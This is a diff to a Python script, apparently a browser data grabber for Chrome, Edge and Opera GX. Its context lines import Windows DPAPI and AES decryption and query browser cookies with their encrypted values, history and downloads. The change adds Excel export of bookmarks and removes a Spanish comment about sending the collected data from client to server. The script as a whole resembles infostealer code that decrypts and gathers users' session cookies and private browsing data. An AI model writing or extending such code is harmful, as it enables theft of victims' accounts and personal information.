@@ -1,6 +1,6 @@
 import sqlite3
 import json
-import csv
+import openpyxl
 import re
 import base64
 import win32crypt
@@ -10,8 +10,6 @@ from Cryptodome.Cipher import AES
 
 #pip install pypiwin32
 #pip install pycryptodomex
-
-# Enviar de client a server , haciendo que en el serve se guarden en x sitio.
 
 BasePath = "Data/"
 
@@ -38,6 +36,17 @@ SQL = {
     "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
     "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
     "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;",
+}
+
+# EXCEL File Head
+EXCEL_FILE_HEAD = {
+    "BOOKMARKS_EXCEL_HEAD": ["SITE NAME", "URL"],
+}
+#EXCEL path
+RESULT_EXCEL_FILE_PATH = {
+    "CHROME_BOOKMARKS_EXCEL_PATH": BasePath + "Chrome_bookmarks.xlsx",
+    "EDGE_BOOKMARKS_EXCEL_PATH": BasePath + "Edge_bookmarks.xlsx",
+    "OPERAGX_BOOKMARKS_EXCEL_PATH": BasePath + "Opera_bookmarks.xlsx"
 }
 
 def get_db_data(file,command,master_key=None):
@@ -180,23 +189,36 @@ def get_cookies(nav):
 
 def get_bookmarks(nav):
     global path
+    global excel_path
 
     if nav =="Chrome":
         path = PATH["CHROME_BOOKMARKS_FILE_PATH"]
+        excel_path = RESULT_EXCEL_FILE_PATH["CHROME_BOOKMARKS_EXCEL_PATH"]
     elif nav == "Opera":
         path = PATH["OPERAGX_BOOKMARKS_FILE_PATH"]
+        excel_path = RESULT_EXCEL_FILE_PATH["OPERAGX_BOOKMARKS_EXCEL_PATH"]
     elif nav == "Edge":
         path = PATH["EDGE_BOOKMARKS_FILE_PATH"]
+        excel_path = RESULT_EXCEL_FILE_PATH["EDGE_BOOKMARKS_EXCEL_PATH"]
+
+    wb = openpyxl.Workbook()
+    data = wb.active
+    data.append(EXCEL_FILE_HEAD["BOOKMARKS_EXCEL_HEAD"])
     try:
         with open(path, 'r', encoding="utf-8-sig") as f:
-
             json_data = f.read()
-            data = []
-            match_date_added = re.findall("\"date_added\": \"(.*?)\",([\s\S]*?)\"guid\": \"", json_data, re.S)
             match_name = re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"", json_data, re.S)
             match_url = re.findall("\"url\": \"(.*?)\"", json_data, re.S)
             for i in range(0, len(match_url)):
+                try:
+                    temp = (str(match_name[i][0]), str(match_url[i]))
+                    data.append(temp)
+                except ValueError:
+                    print("Cant")
                 print(match_name[i][0],match_url[i])
+                print(temp)
+            wb.save(excel_path)
+
     except FileNotFoundError:
         print("No hay fichero")
 
